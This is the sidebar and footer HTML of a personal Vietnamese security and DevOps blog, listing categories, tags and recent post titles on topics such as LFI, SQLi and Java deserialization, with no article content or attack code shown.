    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto">
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center">来年の事を言えば鬼が笑う</p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                Bài đăng
            </span>
            <span class="count">
                13
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                Thể loại
            </span>
            <span class="count">
                12
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                Thẻ
            </span>
            <span class="count">
                13
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/">Nginx</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/LFI/">LFI</a><span class="category-list-count">1</span></li></ul></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
      <div class="tag-clouds">
        <a href="/tags/Commons-Collections/" style="font-size: 0.72em;">Commons Collections</a> <a href="/tags/Deserialization/" style="font-size: 0.76em;">Deserialization</a> <a href="/tags/DevOps/" style="font-size: 0.64em;">DevOps</a> <a href="/tags/Docker/" style="font-size: 0.68em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.6em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/LFI/" style="font-size: 0.6em;">LFI</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Nginx/" style="font-size: 0.6em;">Nginx</a> <a href="/tags/PHP/" style="font-size: 0.6em;">PHP</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/"><i class="fa  fa-book"></i> lfi-to-rce-via-pearcmd-or-peclcmd</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/07/17/gobuffalo-soda-cli/"><i class="fa  fa-book"></i> gobuffalo-soda-cli</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/06/23/kubernetes-learning/"><i class="fa  fa-book"></i> Kubernetes learning</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/04/15/nginx-learning/"><i class="fa  fa-book"></i> Nginx Learning Journey</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/03/20/CommonsCollections3/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 3</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
        
        </div>
    </div>
</div>
<footer>
    <div id="footer" class="ap-lrc">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                        <li><a href="mailto:rayin.awarf@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope"></i></a></li>
                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
                        
                        
                        
                        
                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2023 Rayinaw All rights reserved.</li>
                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank" rel="external nofollow noopener noreferrer">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank" rel="external nofollow noopener noreferrer">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js server="netease" type="playlist" id="3204190542" order="random" fixed="true">
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>



<!-- Extra support for third-party plguins  -->


    </body>
</html>